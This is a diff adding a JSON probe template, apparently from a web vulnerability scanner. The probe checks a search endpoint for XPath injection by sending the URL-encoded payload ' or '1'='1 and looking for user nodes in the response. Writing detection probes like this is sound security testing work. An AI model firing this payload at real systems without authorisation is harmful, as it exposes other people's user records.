@@ -1,0 +1,32 @@
+{
+  "name": "web/XPath injection boolean wildcard probe",
+  "description": "[high] Proves XPath filter injection: `' or '1'='1`-style payload returns EVERY user node = query string concatenated into an XPath expression without escaping (CWE-643). Keywords: xpath injection boolean wildcard xml query enumeration. ctrl: invalid/empty filter returns no user nodes -> not falsified. base_url = XML-backed search endpoint.",
+  "cwe": "CWE-643",
+  "requests": {
+    "payload": {
+      "method": "GET",
+      "url": "{{base_url}}/search?name=%27%20or%20%271%27%3D%271"
+    }
+  },
+  "conditions": [
+    {
+      "type": "status",
+      "request": "payload",
+      "equals": 200
+    },
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "<user>",
+      "present": true
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "fb54add85f34",
+  "created": "2026-11-06T04:51:35.422905+00:00",
+  "last_used": "2026-11-06T04:51:35.422905+00:00"
+}
